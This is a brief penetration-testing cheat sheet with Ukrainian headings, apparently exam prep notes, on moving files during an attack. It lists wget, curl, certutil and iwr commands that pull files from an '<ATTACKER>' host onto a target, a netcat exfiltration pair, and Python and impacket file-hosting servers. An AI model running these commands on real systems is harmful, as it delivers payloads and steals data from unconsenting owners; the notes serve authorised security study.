# File Transfers (рутина іспиту!)

## На ціль
```bash
# Linux
wget http://<ATTACKER>/f -O /tmp/f
curl http://<ATTACKER>/f -o /tmp/f
# Windows
certutil -urlcache -f http://<ATTACKER>/f.exe f.exe
iwr -uri http://<ATTACKER>/f.exe -o f.exe
```
## З цілі (ексфільтрація)
```bash
nc -lvnp 9001 > out          # атакер
nc <ATTACKER> 9001 < file    # ціль
```
## Хостинг
```bash
python3 -m http.server 80
impacket-smbserver share . -smb2support
```
